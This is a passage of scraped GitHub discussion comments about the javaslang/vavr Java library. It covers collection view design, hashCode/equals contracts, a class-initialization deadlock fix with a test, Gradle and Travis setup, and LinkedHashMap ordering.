the existing *method should make such a change.\nI suppose someone should ask the obvious next question. Does it make sense\nto provide three options, or is it too much bloat?\n\ntoJavaList - O(n): copies to a java.util.ArrayList\nasJavaList/asMutableJavaList - O(1): provides a mutable view by\n   wrapping a mutable pointer to a javaslang List\nasImmutableJavaList - O(1): provides an immutable view[1]\n\n[1] Preferably by wrapping a javaslang List, not by wrapping an\nunmodifiableList around a mutable wrapper around a javaslang List.\n\n/cc @paplorinc https://github.com/paplorinc @seanf\nhttps://github.com/seanf\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/javaslang/javaslang/issues/1728#issuecomment-265141479,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AADTi7cBggSRYuCIZ-eDR6tVVHf0lji9ks5rFVlCgaJpZM4K_0Ve\n.\n. Thanks @paplorinc, yes this is the sort of thing.\n\nHonestly I'm still very new to Javaslang, but I get the impression Seq might be too abstract to implement java.util.List efficiently - I suppose ListIterator is the big problem here. Perhaps IndexedSeq would be a better fit.\nI suppose it would also be possible for IndexedSeq to override the ListIterator methods with a custom ListIterator (one that doesn't make a copy with toJavaList()), but if these methods can't be implemented efficiently in Seq, perhaps it should stick to being an Iterable.. I forgot that I can use reviewable.io even without an official link, so here goes.\n\nI will be gone for a few days, I think this can be merged as it is (Set, Map and MultiMap weren't affected).\n\nThanks @paplorinc I trust that means you won't change the history again for a while. :-)\nI've decided to have a go at some of my suggested changes myself. I've put in another PR based on this branch: https://github.com/javaslang/javaslang/pull/1751\n\nReviewed 8 of 8 files at r1.\nReview status: all files reviewed at latest revision, 10 unresolved discussions.\n\njavaslang/src/main/java/javaslang/collection/JavaConverters.java, line 38 at r1 (raw file):\n\nJava\n */\nfinal class JavaConverters {\n    private static final boolean SHOULD_MUTATE = true;\n\nNaturally I'm not keen on setting this to true. :-)\n\njavaslang/src/main/java/javaslang/collection/JavaConverters.java, line 65 at r1 (raw file):\n\nJava\n    static class SeqAsJavaList<T, S extends Seq<T>> implements java.util.List<T>, Serializable {\n        private static final long serialVersionUID = 1L;\n        private final ListIteratorFactory<T, S> listIteratorFactory;\n\nI wonder if these ListIteratorFactorys (which are currently lambdas) could interfere with serialization (eg between JVMs).\nhttp://stackoverflow.com/questions/38018415/how-to-safely-serialize-a-lambda\n\njavaslang/src/main/java/javaslang/collection/JavaConverters.java, line 157 at r1 (raw file):\n\nJava\n        public boolean addAll(Collection<? extends T> collection) {\n            setDelegate(delegate.appendAll(collection));\n            return true;\n\n\"Returns: true if this list changed as a result of the call\"\nsetDelegateAndCheckChanged should work here.\n\njavaslang/src/main/java/javaslang/collection/JavaConverters.java, line 164 at r1 (raw file):\n\nJava\n            // may throw an IndexOutOfBoundsException accordingly to the j.u.List.addAll(int, Collection)\n            setDelegate(delegate.insertAll(index, collection));\n            return true;\n\n\"Returns: true if this list changed as a result of the call\"\nhttps://docs.oracle.com/javase/8/docs/api/java/util/List.html#addAll-int-java.util.Collection-\nsetDelegateAndCheckChanged should work here too.\n\njavaslang/src/main/java/javaslang/collection/JavaConverters.java, line 213 at r1 (raw file):\n\nJava\n        @Override\n        public int hashCode() {\n            return Collections.hash(delegate);\n\nI see that Collections.hash currently implements the algorithm required by java.util.List.hashCode(), but I still think it would be safer from a maintainability point of view to use the implementation provided by AbstractList if possible. Alternatively, Collections.hash ought to have a comment advising that the implementation must never be changed. But I don't think it would be a good idea to tie all the javaslang collections to follow java.util's rules forever for all. Safer just to use AbstractList.\n\nhttps://docs.oracle.com/javase/8/docs/api/java/util/List.html#hashCode--\nhttps://docs.oracle.com/javase/8/docs/api/java/util/AbstractList.html#hashCode--\n\n\njavaslang/src/main/java/javaslang/collection/JavaConverters.java, line 218 at r1 (raw file):\n\nJava\n        @Override\n        public String toString() {\n            return delegate.toJavaList().toString();\n\nThis is making a throwaway copy just to call toString(). Wasn't this going to be delegate.mkString(\"[\", \", \", \"]\");?\n\njavaslang/src/main/java/javaslang/collection/JavaConverters.java, line 224 at r1 (raw file):\n\n```Java\n    private void setDelegate(Seq<T> delegate) {\n        if (!SHOULD_MUTATE) throw new UnsupportedOperationException();\n\n```\n\nThis exception would really need to be thrown before going to the trouble of building a new delegate Seq.\n\njavaslang/src/main/java/javaslang/collection/JavaConverters.java, line 237 at r1 (raw file):\n\nJava\n        private boolean setDelegateAndCheckChanged(Seq<?> newDelegate) {\n            final boolean changed = delegate.size() != newDelegate.size();\n            setDelegate((Seq<T>) newDelegate);\n\nGiven that this only checks the size, not the contents, I would suggest that a better name would be setDelegateIfSizeChanged or similar.\nPlus if nothing really has changed, it would be better not to call setDelegate.\n\njavaslang/src/main/java/javaslang/collection/Seq.java, line 142 at r1 (raw file):\n\n```Java\n    Seq appendAll(Iterable<? extends T> elements);\njava.util.List<T> asJava();\n\n```\n\nIntelliJ can't think of a good name when \"introducing local variable\" from this method. At least, I don't think \"java\" is a good name for a Java List.\nGiven the existence of toJavaList(), I think asJavaList() would fit. Although naturally I'd prefer asImmutableJavaList().\n\njavaslang/src/test/java/javaslang/collection/AbstractSeqTest.java, line 198 at r1 (raw file):\n\nJava\n        final java.util.List<Integer> wrapped = source.asJava();\n        final java.util.List<Integer> converted = source.toJavaList();\n\nThere needs to be a test for the round-trip conversions, perhaps something like this:\n    final Seq<Integer> unwrapped = List.ofAll(wrapped);\n\n    assertThat(unwrapped).isSameAs(source);\n\n\nComments from Reviewable\n Sent from Reviewable.io \n. @danieldietrich I'm confused that  you consider my PR (https://github.com/javaslang/javaslang/pull/1751) to have diverged. I just built on top of @paplorinc's last commit, but with the changes I suggested. \nSometimes it's less work for everyone just to make a suggested change as a commit than it is to say \"Can you change this little thing and that little thing?\". I think that's why GitHub makes it possible for maintainers to contribute changes to external PR branches now.\nAnyway, I understand if you want to do it yourself in a TDD fashion to get the API you want, but please find a better review tool than GitHub. \nGitHub reviews are still terrible for large PRs, because you can't really review file by file, and this is not going to be a small PR. I thought the GitHub comments added by Reviewable on my behalf worked quite well, even in isolation. Don't you think so?. Closed in favour of https://github.com/javaslang/javaslang/pull/1752. I'm not quite sure what I'm reading here, but shouldn't there be a few more methods overridden here? \nie nextIndex, hasPrevious, getPrevious, previousIndex. FWIW I like the formatting.. Nice one @paplorinc, but I'm still not sure a list (ie SeqList) which implements listIterator() in linear time should call itself java.util.List. The javadoc for java.util.List warns that the contains/All methods may perform costly linear searches, but doesn't suggest that this is to be expected of listIterator().\nI think the use of SeqList is going to lead to surprising behaviour. (So might the use of remove() on an unmodifiable List of course, but at least that is a well known problem in Java collections, and it is mentioned in the List javadocs.)\nhttps://docs.oracle.com/javase/8/docs/api/java/util/List.html. I know there's a danger about arguing about names forever, but perhaps \"Java\" should be in the name here, for consistency with toJavaList().\nWhat about toImmutableJavaList() or asImmutableJavaList()? \nA name starting with \"to\" should be a little easier to discover, especially when looking for toJavaList(). Although perhaps \"as\" helps to suggest a cheap \"view\" of the underlying list rather than an expensive \"copy\", which might be why I suggested asJavaList() in https://github.com/javaslang/javaslang/issues/1728. Meh. Either way.\nPersonally I think the word \"immutable\" sounds better than \"unmodifiable\". Plus Guava's ImmutableLists have some nice properties which these lists will share, whereas Java's unmodifiableLists... don't (for one thing, they aren't really immutable).\nhttps://docs.oracle.com/javase/7/docs/api/java/util/Collections.html#unmodifiableList(java.util.List). @danieldietrich I'm not sure if you're aware, but GitHub doesn't generally send email notifications about edited comments. @paplorinc may not see your last edit without a mention in a new comment (like this).. Is this hashCode consistent with equals? Java collections break so many rules it's hard to keep track.\nGoing by the javadocs for AbstractList and List.hashCode, it might be best to call AbstractList.hashCode.. Ouch.. Just as a general note (nothing to do with this line): a tool like reviewable.io might reviews like this one a lot easier.. This assumes that the iteration orders of both sets are the same. This should use the same implementation as AbstractSet.equals.. Again, this should probably use the implementation from AbstractSet to ensure equals and hashCode are correct for Set.. Ditto for AbstractMap.equals and .hashCode. (And in the multimap.). No, sorry. I'm not even sure why I picked on this method. Of course it's going to be O(n) to populate a passed-in array. I think I totally misread this implementation earlier. Sorry for the noise!. The problem is that the hashCode/equals rules are a bit different for collections. Which is why two Lists with the same elements are required to be equal regardless of Class, whether it makes sense or not. Consequently the implementation of List.hashCode has additional constraints in its javadoc too - the exact implementation is basically specified so that it consistent between all List classes.. Certainly.. Can we turn this off in PMD? Or should I just call super.hashCode()? Because that's the implementation I want to use. I considered inheriting super.equals too, but this implementation is probably more efficient.. This incurs a fair bit of unnecessary work building the newDelegate collection in the immutable case.\nWhat about another method getDelegateForMutation() which can throw the exception earlier in the immutable case, which will be called by the add/remove/mutator methods instead of getDelegate()?. That might be safer, because not every change will change the size, eg set(). Especially given the current method name.. You know what I'm going to say to that question. :-)\nExceptions aren't nice, but silent failures are worse than noisy failures. Pretending an immutable collection is mutable is bound to end in tears. You would be quietly mutating a secret copy of the immutable list. I'm not sure any other code would ever see that mutated copy.. Now I remember why I objected to return delegate.toJavaList().toArray(array); in the other PR - the O(n) call to toJavaList(). But I suppose that can always be optimised later with help from the delegate. Maybe a comment to that effect?. As I said in the other review:\nI see that Collections.hash currently implements the algorithm required by java.util.List.hashCode(), but I still think it would be safer from a maintainability point of view to use the implementation provided by AbstractList if possible [to ensure consistency with equals()]. Alternatively, Collections.hash ought to have a comment advising that the implementation must never be changed. But I don't think it would be a good idea to tie all the javaslang collections to follow java.util's rules forever for all. Safer just to use AbstractList. [Assuming that's still possible with the new implementation.]\n\nhttps://docs.oracle.com/javase/8/docs/api/java/util/List.html#hashCode--\nhttps://docs.oracle.com/javase/8/docs/api/java/util/AbstractList.html#hashCode--. True. But why not let getDelegateForMutation() be that one place?. I'm pretty sure the j.u.AbstractList implementation won't change from the hashCode implementation which is specified for j.u.List. But I just want to make sure the implementation used by the javaslang views never changes, lest it break that contract. So a comment to that effect in javaslang's hashCode method would be good. A test would be better. . Don't forget to set a null element if the array is oversized: https://docs.oracle.com/javase/8/docs/api/java/util/List.html#toArray-T:A-. It's not clear from the JavaDocs - https://docs.oracle.com/javase/8/docs/api/java/util/ListIterator.html#add-E- - but perhaps IllegalStateException should be thrown in case of any change, even if the ListIterator wasn't the agent.. @danieldietrich \nScratch that. I've got a better idea: swapDelegate(). See https://github.com/danieldietrich/javaslang/compare/collection-views...seanf:collection-views (commit https://github.com/seanf/javaslang/commit/d85c504f00b31ecdfbd75d9fba902dbaff0a947f)\n\nI knew there was a reason I was thinking of Clojure's refs. Or is it atoms? https://github.com/javaslang/javaslang/issues/1728#issuecomment-264870425. @danieldietrich Why the signature change? Was the compiler being difficult?. The List javadoc only mentioned one null, not filling with nulls. Like a NUL-terminated string in C, I suppose.. ",
    "lukaszsoszynski": "Daniel,\nI followed your suggestion and I used Try instead of Option in recovery function. I think that this is a very good idea and I am perfectly fine with it. So finally I added two new functions to Try interface:\n<X> Try<T> recoverWith(Class<X> exception, Function<X, Try<T>> f);\n<X> Try<T> recoverWith(Class<X> exception,  Try<T> recovered) . ",
    "schaloner": "What if you have two objects of the same class in the record?. ",
    "agebhar1": "@agebhar1 ping myself. also for CheckedFunction{0-8}?. I'm on the way for a PR :smile: . The \u00bbScala Maven Plugin\u00bb requires at least Maven 3.5.3 unfortunately the current Travis CI provided Maven 3.5.2:\nmvn -version\nPicked up _JAVA_OPTIONS: -Xmx2048m -Xms512m\nApache Maven 3.5.2 (138edd61fd100ec658bfa2d307c43b76940a5d7d; 2017-10-18T07:58:13Z)\nMaven home: /usr/local/maven-3.5.2\nJava version: 1.8.0_151, vendor: Oracle Corporation\nJava home: /usr/lib/jvm/java-8-oracle/jre\nDefault locale: en_US, platform encoding: UTF-8\nOS name: \"linux\", version: \"4.4.0-112-generic\", arch: \"amd64\", family: \"unix\"\nThere are open issues on Travis to update Maven:\n \u00bbUpdate Maven binary on Travis\u00ab #7719\n \u00bbUpgrade to Maven 3.5.3\u00ab #9366\nWe might use the Maven Wrapper to provide the required Maven Version. What do you think @danieldietrich?. I will update .travis.yml accordingly. Should we use the latest release 3.5.4 @danieldietrich?. You're welcome! When https://github.com/travis-ci/travis-cookbooks/pull/991 is accepted, we can remove the extra lines on .travis.yml.. You're welcome!. ",
    "the-james-burton": "Hi Daniel, thanks for the comprehensive reply, it is very helpful! As I expected, you are thinking two or three steps ahead of me :) I don't really want or need to add functionality to my 'types'. I just want type safety so I can't get a CustomerName mixed up with a CustomerAddress in a constructor (or elsewhere) in code. \nIn my mind, the object-oriented 'is-a' relationship is absolutely pure here... A CustomerName is a CharSeq. So using java extends seems correct and natural. Having a tiny type which obfuscates this into a wrapped 'has-a' relationship feels wrong to me.\nRegarding the problem of equals, why not just declare it final in CharSeq? Would that address the concerns? In fact, every method could be made final in CharSeq and I would be happy, since I have no requirements for extension (especially if achieving that would compromise the design). This would possibly address your concerns 1 and 2.\nRegarding concerns 3 and 4, I think they are deeper. I don't think issue 3 is relevant here as I am only talking specifically about the CharSeq class. Issue 4 is perhaps more of a concern. Maybe it would be safe to accept <? extends CharSeq> if all methods in CharSeq are final? \nAnyway, thanks again for taking the time to read and reply. I fully understand if you want to keep CharSeq final, but I thought it was worth asking. There is no way String is going to become non-final, that's for sure!. ",
    "Opalo": "Hi @danieldietrich,\nFirst of all, thanks for having time for looking at my PR and for great OS library \ud83d\udc4d  Actually I didn't know about #1682 but my work was also loosely inspired on Option.fold from scala. \nIn general I do agree with you, however having an overloaded version of forEach is something that is returning very often in various discussions with my fellow developers. forEach is a very elegant way to finish processing of a particular item (e.g. an Option that was mapped multiple times previously). Not having possibility other than using cumbersome isDefined and if statement makes the code looks just ugly. Summing up, this is not the way I'd like to go in this particular case.\nNevertheless, thanks once again for you work and I'm looking forward to using JavaSlang v. 3.0. If you need any help, just let me know \ud83d\ude09 . @danieldietrich well, that looks definitely awesome! I also had thought about returning this from forEach and providing a kind of runIfEmpty method however that was impossible because of Iterable contract.\nYour idea provides the missing value: handles the emptiness in a concise way. I'm happy to issue an another PR along with tests to provide this emptiness handling in Option class.. @danieldietrich sorry for the delay, PR will be ready just after New Year \ud83c\udf89 . Always happy to help! Thanks for accepting the PR, we really need this feature :). Hi @danieldietrich! \nThanks for your reply and yes I've an example where in my opinion javaslang does not behave in a way I'm expecting - (no offence, I really do consider javaslang as a great library :) )\nHave a look at the following piece of code:\npublic void setImage(List<FileUpload> image) {\n   if (image != null) {\n      Option\n         .of(image)\n         .filter(fileUploads -> fileUploads.size() == 1)\n         .map(fileUploads -> fileUploads.get(0))\n         .map(fileUpload -> Tuple.of(Try.of(fileUpload::getInputStream), getExtension(fileUpload.getClientFileName())))\n         .map(tuple -> Tuple.of(tuple._1, getImageFilename(tuple._2)))\n         .map(tuple -> Tuple.of(tuple._1, getImagePath(tuple._2)))\n         .toTry()\n         .andThenTry(tuple -> deleteIfExists(tuple._2))\n         .andThenTry(tuple -> copy(tuple._1.get(), tuple._2))\n         .onSuccess(tuple -> log.info(\"Image: {} for user: {} uploaded successfully\", tuple._2, editable.getEmail()))\n          .onFailure(err -> {\n                    log.error(\"Error while uploading image for user: {}, err: {}\", editable.getEmail(), err);\n                    throw new IllegalStateException(String.format(\"Error while uploading file for user: %s\", editable.getEmail()));\n        });\n     }\n}\nThis is an extract from wicket model - it's used for file uploading. Here's also an important excerpt from the docs:\n\nThe model of this component is reset with null at the end of the request because FileUpload instances do not survive across requests since the input streams they point to will be closed. Because of this, the FileUpload instance should be processed within the same request as the form containing it was submitted.\n\nTL;DR it means that setImage method will be invoked twice. First time with an argument and with null for the second time. I thought that wrapping the argument in an Option and then processing it will be sufficient, however when the method is called with null for the second time toTry() crashes with NoSuchElementException.  I'd rather expect it to become an instance of Try.Failure under the hood. \nI'm not sure if I've used javaslang properly here. In case of any objections just let me know. I'm happy to elaborate on this.. Thanks @danieldietrich for your time and valuable input! \ud83d\udc4d . Hi @danieldietrich,\nYes, I reacted with +1 since I probably have a scenario where Just (as far as I understood it) will be the missing being. In my project there is a class called EmailFactory which is responsible.. for creating emails. It has a single method createEmail which accepts single argument, a DTO class, named EmailData. EmailData is passed as is - it's not wrapped in any container (Option, whatever), hence I've no starting point for further processing which looks like below:\n```\npublic void createEmail(EmailData data) {\n        notNull(data, \"Email data cannot be null!\");\n        final EmailDraft draft = Option\n            .of(data)\n            .map(EmailData::getClass)\n            .map(EmailTemplateType::forDataClass)\n            .map(templateLoader::findByType)\n            .map(template -> draftFactory.createDraftWith(template, data))\n            .get();\n    if (data.hasNoRecipients()) {\n        log.info(\"No recipients for e-mail with title `{}`\", draft.getSubject());\n    }\n\n    data.getRecipients().forEach(recipient ->\n        messageRepository.save(new EmailMessage(draft.getSubject(), recipient, draft.getContent()))\n    );\n}\n\n``\nand I need to start withOptionwhereasJustlooks like a perfect fit here. It represents aValuethat has some _value_ set. I don't want to acceptOptionargument since I've read this is not a good practice. Also I don't think if anOptionis good starting point here.. I've looked around a bit and it seems that _internal_ is something that makes sense in java 9 world. Whether it's _internal_ or any other name doesn't make difference - it's a (sub)package that isn't exported viamodule-info.java`. \n@talios mentioned quite important matter - what about java 8 support?. > In Java 8 such an internal package would leak the implementation classes to the outside, because they need to be public.\nWith internal package you can always warn the end users that this package's content may change at any time and you're not responsible for these changes \ud83d\ude09 Of course it doesn't make much sense and even though such packaging (I mean internal) is quite common it's a leaky abstraction and don't like it much.\n\nTherefore I think it is a better solution, to put make the implementation classes package-private and put them directly into the package of their interfaces/abstract classes. This will solve our original use-case of hiding the classes for both, Java 8 and Java 9.\n\nThis (^) sounds really good. I'm wondering only if this is possible for all classes - no implementation will leak.\nAlso, I know that Java 8 and 9 builds have exactly the same source right now hence mrjar can be used. Will it change in foreseeable future? If so maybe it's better idea to prepare separate builds now and save some time in the future. No idea if this is a good suggestion, rather asking \ud83d\ude09 \nLet me know if you need any help with gradle.. @danieldietrich here you have a simple workaround:\n```\nclass JavaModule {\n    String name\n}\nclass modularity implements Plugin {\n    void apply(Project project) {\n        def extension = project.extensions.create('javaModule', JavaModule)\n    }\n}\nsubprojects { s ->\napply plugin: 'java'\napply plugin: modularity\n\nrepositories {\n    jcenter()\n}\n\ngroup = 'io.vavr'\nversion = '1.0.0'\n\njavaModule {\n  name = s.name\n}\n\ncompileJava {\n    sourceCompatibility = 8\n    targetCompatibility = 8\n    options.encoding = 'UTF-8'\n    options.compilerArgs = [ '-Xlint:all', '-Werror' ]\n}\njar {\n    manifest.attributes(\n        'Automatic-Module-Name': javaModule.name\n    )\n}\n\n}\n```\nWhat you want to do is quite tricky since you have configured a cycle. Just replace root build.gradle with this piece of code and remove build.gradle files from submodules. I have very little time right now - if this suggestion does not satisfy you - may try to help late in the evening (c.a. 2200 CET).. So add this to settings.gradle:\ndef conf = ['io.vavr.core' : 'vavr-core']\nconf.each { k, v ->\n  include k\n  project(\":$k\").name = v\n}\nOf course map (conf) ^ should have entries for both modules.  Time for climbing, keep me posted. . Yes, definitely. This is a very good piece of gradle configuration :). @ruslansennov sure! Wasn't sure about contribution rules. Will remove it.. @danieldietrich you are absolutely right - sorry for not adding it. I've amended the commit with required null-check.. ",
    "igoonich": "Here is one more test, which can be used to reproduce this issue:\n```\npublic class JavaslangClassInitializationDeadlockTest {\n@Test(timeout = 5_000)\npublic void testConcurrentClassInitialization() throws InterruptedException {\n    ExecutorService executorService = Executors.newFixedThreadPool(2);\n    executorService.execute(new ClassInitializer(\"javaslang.collection.Iterator\"));\n    executorService.execute(new ClassInitializer(\"javaslang.collection.AbstractIterator\"));\n    executorService.shutdown();\n    // try to access javaslang iterator and it will hang\n    Iterator.empty().iterator();\n}\n\npublic static class ClassInitializer implements Runnable {\n    private String type;\n\n    public ClassInitializer(String type) {\n        this.type = type;\n    }\n\n    public void run() {\n        try {\n            Class.forName(type);\n        } catch (ClassNotFoundException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n\n}\n. Just in case, here is a thread dump from our environment, taken at the point of time when we got such a deadlock last time:\n\"health-checker\" #192 daemon prio=5 os_prio=0 tid=0x00007ffba8101000 nid=0x5375 in Object.wait() [0x00007ffba1391000]\n   java.lang.Thread.State: RUNNABLE\n        at javaslang.collection.Iterator.(Iterator.java:51)\n    ...\n        at java.util.TimerThread.mainLoop(Timer.java:555)\n        at java.util.TimerThread.run(Timer.java:505)\n\"Thread-4-fail-fast\" #31 prio=5 os_prio=0 tid=0x00000000016fa800 nid=0x52d7 in Object.wait() [0x00007ffbaf4f5000]\n   java.lang.Thread.State: RUNNABLE\n        at javaslang.collection.Traversable.iterator(Traversable.java:553)\n        at javaslang.Value.forEach(Value.java:246)\n        ...\n        at java.lang.Thread.run(Thread.java:745)\n```\n. Similar issue in guava was fixed recently in 19.0.0 - https://github.com/google/guava/issues/1977.. ",
    "eremeev": "Find the suggested fix. Anyway, the fix does not save from deadlock if the anonymous class is loaded via reflection. In my opinion EMPTY should be deprecated and moved to another class in some future release.\n```\ndiff --git a/javaslang/src/main/java/javaslang/collection/Iterator.java b/javaslang/src/main/java/javaslang/collection/Iterator.java\nindex 9225b84..3d140b2 100644\n--- a/javaslang/src/main/java/javaslang/collection/Iterator.java\n+++ b/javaslang/src/main/java/javaslang/collection/Iterator.java\n@@ -54,16 +54,20 @@ public interface Iterator extends java.util.Iterator, Traversable {\n     /*\n      * The empty Iterator.\n      /\n-    Iterator EMPTY = new AbstractIterator() {\n-\n+    Iterator EMPTY = new Iterator() {\n         @Override\n         public boolean hasNext() {\n             return false;\n         }\n     @Override\n\n\npublic Object getNext() {\nreturn null;\npublic Object next() {\nthrow new NoSuchElementException(\"next() on empty iterator\");\n}\n+\n@Override\npublic String toString() {\nreturn stringPrefix() + \"()\";\n         }\n     };\n\ndiff --git a/javaslang/src/test/java/javaslang/collection/IteratorTest.java b/javaslang/src/test/java/javaslang/collection/IteratorTest.java\nindex 20bc239..aacb207 100644\n--- a/javaslang/src/test/java/javaslang/collection/IteratorTest.java\n+++ b/javaslang/src/test/java/javaslang/collection/IteratorTest.java\n@@ -8,16 +8,17 @@ package javaslang.collection;\n import javaslang.Tuple;\n import javaslang.Tuple2;\n import javaslang.Tuple3;\n-import javaslang.Value;\n import javaslang.control.Option;\n import org.assertj.core.api.Assertions;\n import org.assertj.core.api.IterableAssert;\n import org.assertj.core.api.ObjectAssert;\n+import org.junit.Assert;\n import org.junit.Test;\nimport java.math.BigDecimal;\n import java.util.ArrayList;\n import java.util.NoSuchElementException;\n+import java.util.concurrent.atomic.AtomicBoolean;\n import java.util.function.Function;\n import java.util.function.Supplier;\n import java.util.stream.Collector;\n@@ -515,4 +516,22 @@ public class IteratorTest extends AbstractTraversableTest {\n         // Iterator equality undefined\n     }\n\n@Test(timeout = 5_000)\npublic void testDeadlock() throws InterruptedException {\nAtomicBoolean failed = new AtomicBoolean();\nThread thread = new Thread(() -> {\ntry {\nClass.forName(\"javaslang.collection.AbstractIterator\");\n} catch (Exception e) {\ne.printStackTrace();\nfailed.set(true);\n}\n});\nthread.start();\n+\nIterator.empty();\n+\nthread.join();\nAssert.assertFalse(failed.get());\n}\n }\n``. Looks good, but I would prefer package-private final class instead of interface, and Iterator#empty should returnIteratorModule.EMPTY.\nAlso, I like howEmptyIteratoris done in JDK (Seejava.util.Collections#emptyIterator`).. Iterator and AbstractIterator will be loaded in the main thread, thus, no concurrency.\nYou have to pass string constants here.. \n",
    "QuantumBear": "Sorry, a simple return could resolve this.. ",
    "xenoterracide": "sorry, my brain did some interpolation as I've been playing with writing my own Try, the name here is CheckedFunction.\nstrategies is just a java.util.Stream\nStream.of(...).map(Try.of( x -> ... y ).onFailure( ... ) ). ...,\nif that code isn't right then I have no idea what the right code would be given the documentation of Try\nJust trying to do a simple wrapper of any usage of java.util.Function where the method reference or lambda I'm using would throw a checked exception. usually needed when using \"streams\". I'm not sure about flatmap because I use map with Optional too (yay for them not making map(...) and stream() interfaces.... I'm of the believe that if you don't supply a value (or whatever) for orElse then it should return null, as if I didn't provide an alternative return value in a Supplier/Function, I would likely return a null.\nfor example in this brokenness that I'm likely to reimplement anyways. Logger is just an slf4j wrapper that just takes an exception. (note: the fileCreator stuff throws IOException, because dealing with InputStream's)\nOptional<FileCreator> fileCreator = strategies.map(\n                s -> Try.of( () -> s.fileCreatorFor( file ) ).onFailure( log()::error ).get() )\n                .filter( Optional::isPresent )\n                .map( Optional::get )\n                .findFirst()\n                .map( fc -> Try.of( fc::createFile ).onFailure( log()::error ).get() )\n                .filter( FileCreator::filter );\nA simpler example ( that is terrible  as all simple examples are )\nStream.of( -1, 0, null, 1, 2, 3 ).map(  Try.function( i -> i % 2 ).onFailure( e -> log.error(\"{}\", e ).magic? ).filter( Objects::nonNull ).collect( Collectors.counting ); // 5. eh, not really, I already have a working-ish version of this, I was just looking a javaslang to see if it was doing it better, or would make my life easier in implementing.. ",
    "orionll": "@ruslansennov There is one more bug: map.hashCode() != map2.hashCode(). Two equal objects must have the same hash codes. This is very easy to fix: just return the sum of hash codes of each key-value pair.. And HashSet.hashCode() is also incorrect.. java\nreturn Objects.hash(hash, value) + tail.hashCode();\nI think this can fail with StackOverflowError if the map contains large number of keys with the same hash codes.\nTry something like this:\n```java\nclass A {\n    @Override\n    public int hashCode() {\n        return 1;\n    }\npublic static void main(String[] args) {\n    HashMap<A, Integer> map = HashMap.empty();\n    for (int i = 0; i < 10000; i++) {\n        map = map.put(new A(), i);\n    }\n    System.out.println(map.hashCode());\n}\n\n}\n```\nI suggest rewriting hashCode() the same way it is done in java.util.AbstractMap. This is simple and safe: http://hg.openjdk.java.net/jdk9/jdk9/jdk/file/37a05a11f281/src/share/classes/java/util/AbstractMap.java#l490. ",
    "noorulhaq": "Damn it! I tried with flatMap but in wrong order. Thumbs up for your help and trillion thumbs down for myself.. Thanks for the buck up. I am writting an article on funtional domain modeling in Java8 using your library. Once, I am finished with that I will share with you the article. We can then discuss some more functional possibilities that are easy to define.. I had the same hunch that this might cause performance problems. Anyways, thanks for the explanation. I can manage with some extra gets until I am confident that I am doing in right context.. Thanks for your reply. Right now Future is my problem. Why futre contains value stacked up this way\njava Option<Try<Option>> instead of just Try<Option>. ",
    "Kreinoee": "Why not make List an abstract class instead of an interface. By giving the abstract List class an private constructor, we can ensure that only inner classes can extend it, and thereby guaranty that all instances of the List class is immutable.\nCurrently I consider List as not being immutable, because when I create a method that takes a List, client could just as well pass in there own mutable implementation. This is fine on the generel interfaces, but the concrete implementations (as List is one of), should be able to completely guaranty immutability.. But List is not the contract LinearSeq and Seq is. What does list add to the contract that these to interfaces is not?\nList is an concreate implementation of linearSeq just as Queue is it, and Queue is a concrete class that cannot be extended. Also comparing List from javaslang with List from java.util is wrong, as List is more on the same level as java.util.LinkedList, where Seq and java.util.List is more alike.\nHaving interfaces defining the contract, and then concrete not extendable classes providing standard implementations that can guaranty either immutability or a certain performance behaviour is in my opinion really good practice. Then your can freely chose when implemting code, if your want to work on contract level, or instead needs the concrete implementations.\nMy quess is that the javaslang collection library is inspired by the scala collection framework, and if we look there, its actually done in this way. There are interfaces providing the contract, allowing for extendability, but the concrete implementations does not. \nAnother reason is that implementing a class, so it actually can be extended can complicate stuff a bit, so its often better to disallow concrete classes being extended, and instead define the functionality in an interface. We can look at the guidelines for implementing custom collections in java, they say to extend AbstractCollection, AbstractSet, AbstractMap and so on, instead of extending the conrete classes like ArrayList, even though this is possibly. I would guess that if they could make ArrayList and the similar classes  final they would do so, as extending these has turned out to be problematic. However they cannot due to backward compability.\nAnd finnally when the collections is used as fields in a class that needs to be fully immutable, then List is not an option as long as its an interface as illustrated her (assuming Person is an Immutable class) : \npublic final class Department {\n    private final List<Person> employes;\n\n    public Department(List<Person> employes) {\n        this.employes = employes\n    }\n\n    public boolean containsAllTheseEmployes(Seq<Person> ) { ... }\n}\n\nHowever if I change the List to a Vector the class can guaranty immutability, as Vector is an concrete class that cannot be extended. I think that this both demonstrates a problem with List in it self, but also that it's confusing that there is such a fundamental difference on two classes, that is actually  on the same level of the hierarchy, of the same collection library.   . I must admit that I am not aware of the reasons for Future and Promise being traits in Scala, but my best guess would be, that they have no characteristics that forces them to be none extendable:\n\nThey are mutable by nature.\nThey promice no specific performance characteristics.. \n",
    "thekaratekid05": "alas it seems Scala behaves the same\n```scala\nscala> import collection.immutable.ListMap\nimport collection.immutable.ListMap\nscala> val map = ListMap(1 -> 1, 2 -> 2, 3 -> 3)\nmap: scala.collection.immutable.ListMap[Int,Int] = ListMap(1 -> 1, 2 -> 2, 3 -> 3)\nscala> val updated = map + (2 -> 20)\nupdated: scala.collection.immutable.ListMap[Int,Int] = ListMap(1 -> 1, 3 -> 3, 2 -> 20)\n```. ",
    "yuriykulikov": "Hello everyone.\nThis is very unfortunate. Java LinkedHashMap retains insertion order in values() iterator.\nIs there still any possibility the behavior of Vavr LinkedHashMap will be chagned?. Would you prefer a pull request or to implement it yourselves? This is, in case you decide it makes sense:-)\nShould be a small change in\n@Override\n    public LinkedHashMap<K, V> put(K key, V value) {\n        Queue<Tuple2<K, V>> newList = list;\n        HashMap<K, V> newMap = map;\n        if (containsKey(key)) {\n            //find the index of the element in the list, remove by index, insert using the same index\n            //this will effectively retain the position in the list\n            newList = newList.filter(t -> !Objects.equals(t._1, key));\n            newMap = newMap.remove(key);\n        }\n        newList = newList.append(Tuple.of(key, value));\n        newMap = newMap.put(key, value);\n        return new LinkedHashMap<>(newList, newMap);\n    }\n. I see you have already implemented everything while I was forking/cloning :-)\n. One list traversal less, right?\n. you can use wrap(newList, newMap) instead of new LinkedHashMap<>(newList, newMap) while you are at it:-). list.replace is O(n) I believe, find() as well. My initial suggestion with index will also be O(n) since it is a linked list. It does not get faster than the last variant by Daniel.. You guys are awesome! Thanks!. Hello,\nis not a little bit too early for Java 8?\nIf Java 8 support is dropped, it will effectively mean that I will not be able to use Vavr in any of my projects (private and at work). Android is likely to be stuck on Java 8 for a long time.\n. Regarding 